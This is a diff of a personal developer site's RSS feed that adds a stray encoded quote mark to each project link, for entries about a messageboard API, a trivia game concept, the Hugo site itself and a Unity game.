-        <link>https://www.phireheavyindustries.com/p/untitled-messageboard-api/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/untitled-messageboard-api/</link>
         <pubDate>Mon, 10 Aug 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/untitled-messageboard-api/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/untitled-messageboard-api/</guid>
         <description>&lt;p&gt;This is a project abandoned by a client but i have decided to finish it myself. It is a small social network oriented to allow users to comment on various topics or products. The objetive was to have several discussions rooms where one supervisor or admin would launch a topic of discussion and then he/she would create teams based on gender, age and location. The users would then be allowed to voice their opinions on the matter at hand. The best way to go about building such an app would be to have two separate components:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;A backend, in the form of a REST Api, built for this example in .Net Core 3.1 with Entity Framework&lt;/li&gt;
@@ -1460,10 +1693,10 @@
         </item>
         <item>
         <title>Quizbreaker</title>
-        <link>https://www.phireheavyindustries.com/p/quizbreaker/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/quizbreaker/</link>
         <pubDate>Sun, 02 Aug 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/quizbreaker/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/quizbreaker/</guid>
         <description>&lt;p&gt;I love the idea of making some sort of digital game that could be played by a group of people in person. This is a very early concept for a trivia game where one user would build a quiz with a number of questions. Then they would invite other players to play. One user would ask the questions and the others would play, either individually or on teams. Since this would be a multiplayer game there are a number of technologies that would have to implemented, along with a number of decisions:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;How is the quiz stored? Which backend would be used?&lt;/li&gt;
@@ -1499,10 +1732,10 @@
         </item>
         <item>
         <title>phireheavyindustries.com</title>
-        <link>https://www.phireheavyindustries.com/p/phireheavyindustries.com/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/phireheavyindustries.com/</link>
         <pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/phireheavyindustries.com/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/phireheavyindustries.com/</guid>
         <description>&lt;p&gt;Yes, it&amp;rsquo;s this site. This is made using the &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Hugo&lt;/a&gt; framework and is hosted on &lt;a class=&#34;link&#34; href=&#34;https://porkbun.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Porkbun&lt;/a&gt;. I find that the static content generator is a great tool to use for personal and small sites, but as any project, this is a work in progress. It&amp;rsquo;s still missing:&lt;/p&gt;
@@ -1515,10 +1748,10 @@
         </item>
         <item>
         <title>Zenbreaker</title>
-        <link>https://www.phireheavyindustries.com/p/zenbreaker/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/zenbreaker/</link>
         <pubDate>Tue, 01 Oct 2019 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/zenbreaker/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/zenbreaker/</guid>
         <description>&lt;p&gt;This was a simple experiment in Unity to better understand the mechanics of what it takes to build a simple game, including launching and publishing to the Play Store. It has since been abandoned.&lt;/p&gt;
 </description>
         </item>
